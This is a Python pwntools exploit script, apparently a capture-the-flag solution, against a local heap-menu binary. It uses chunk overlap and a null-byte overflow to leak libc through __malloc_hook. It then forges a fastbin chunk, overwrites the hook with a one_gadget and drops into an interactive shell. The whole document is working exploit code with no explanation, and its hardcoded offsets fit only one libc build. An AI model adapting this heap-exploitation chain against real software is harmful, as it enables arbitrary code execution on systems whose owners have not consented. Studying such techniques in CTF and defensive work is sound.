#!/usr/bin/env python
from pwn import *
import pwnlib

p = process('./binaryname')
context.terminal = ['gnome-terminal','-x','sh','-c']
libc = ELF('libc.so.6')
elf = ELF('binaryname')
one  = 0x4526a

def add(size,content):
    p.recvuntil('choice: ',timeout=1)
    p.sendline('1')
    p.recvuntil('please input chunk size: ')
    p.sendline(str(size))
    p.recvuntil('input chunk content: ',timeout=1)
    p.sendline(content)

def show(index):
    p.recvuntil('choice: ')
    p.sendline('2')
    p.recvuntil('please input chunk index: ')
    p.sendline(str(index))
    p.recvuntil('content: ')
    #return p.recv()

def delete(index):
    p.recvuntil('choice: ',timeout=1)
    p.sendline('3')
    p.recvuntil('please input chunk index: ',timeout=1)
    p.sendline(str(index))

def g():
    pwnlib.gdb.attach(p)
    raw_input()

add(0x100,'a'*0x100)   #0      0x110
add(0x78,'b'*0x70)     #1      0x80
add(0xf0,'c'*0xf0)     #2      0x100
add(0x40,'e'*0x40)     #3
delete(0)
delete(1)
add(0x78,'d'*0x70+p64(0x190))    #0
delete(2)
add(0x100,'f'*0x100)      #1
show(0)
libc_addr = u64(p.recv()[0:6].ljust(8,'\0')) - libc.symbols['__malloc_hook'] - 0x68
print "libc address is : " + hex(libc_addr)

offset = 0x7f2fb094e450-0x7f2fb08e3fe0    #system
ga = libc_addr + offset - (0x000000000045390-one)
print "system is : "+hex(libc_addr+offset)
malloc_hook = libc.symbols['__malloc_hook'] + libc_addr
print "one gadget is : " + hex(ga)
print "__malloc_hook is : " + hex(malloc_hook)
fake_chunk = malloc_hook - 0x23
free  = libc.symbols['__free_hook'] + libc_addr
print "fake chunk is : " + hex(fake_chunk)
print "free is : "+hex(free)

delete(1)

add(0x90,'f'*0x80)     #1
add(0x60,'g'*0x60)     #2
add(0x60,'h'*0x60)     #4        overlap the chunk 0

delete(4)
delete(2)
delete(0)

add(0x60,p64(fake_chunk)+p64(0)+'j'*0x50)
add(0x60,'k'*0x60)
add(0x60,'l'*0x60)
add(0x60,'m'*0x13+p64(ga)+"\n")

p.recvuntil('choice: ',timeout=1)
p.sendline('1')
p.recvuntil('please input chunk size: ',timeout=1)
p.sendline(str(0x60))
raw_input()
p.interactive()
